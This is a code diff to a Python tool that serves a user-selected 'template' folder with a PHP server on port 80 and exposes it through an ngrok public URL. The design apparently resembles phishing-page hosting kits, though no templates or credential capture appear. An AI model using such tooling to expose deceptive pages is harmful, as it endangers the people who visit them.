@@ -31,6 +31,9 @@ from includes import dynamic_url
 from includes import config_status
 from rich.console import Console
 from rich.panel import Panel
+import os
+import subprocess
+import threading
 import time
 
 from colorama import Fore, Style, init
@@ -56,16 +59,40 @@ def main():
             if selected_template:
                 print(Fore.GREEN + "✅ " + Style.BRIGHT + "Selected Template: " + Fore.CYAN + f"{selected_template}" + Style.RESET_ALL)
                 template_path = os.path.join("templates", selected_template)
-             
-                #url = dynamic_url.re_url()
+
                 local_ip = utils.getip()
                 ngrok_url = dynamic_url.re_url()
+
                 print()
                 print(f"{Fore.CYAN + Style.BRIGHT}[🌐 Localhost URL]{Style.RESET_ALL}   ➤  {Fore.YELLOW}http://{local_ip}/{selected_template}/")
                 print(f"{Fore.GREEN + Style.BRIGHT}[🚀 Ngrok Public URL]{Style.RESET_ALL} ➤  {Fore.MAGENTA}{ngrok_url}/{selected_template}/")
                 print()
-                input("Press Enter to go back to main menu...")
-                
+
+                # Function to run PHP server
+                def run_php():
+                    
+                    php_process = subprocess.Popen(
+                        ["php", "-S", "0.0.0.0:80"],
+                        cwd=template_path,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.STDOUT,
+                        text=True
+                    )
+                    try:
+                        for line in php_process.stdout:
+                            print(f"{Fore.WHITE}[PHP]{Style.RESET_ALL} {line.strip()}")
+                    except KeyboardInterrupt:
+                        pass
+
+                # Run PHP server in background thread
+                server_thread = threading.Thread(target=run_php, daemon=True)
+                server_thread.start()
+
+                # Wait for user input to stop
+                if input(f"{Fore.RED}⛔ Press 0 to stop the PHP server and return to menu: {Style.RESET_ALL}").strip() == "0":
+                    print(f"{Fore.YELLOW}🛑 Stopping PHP server...{Style.RESET_ALL}")
+                    os.system("pkill -f 'php -S'")  # Works on Unix/macOS. For Windows, use .terminate() with stored process.
+                        
                
             else:
                 print("🔙 Returning to main menu...")
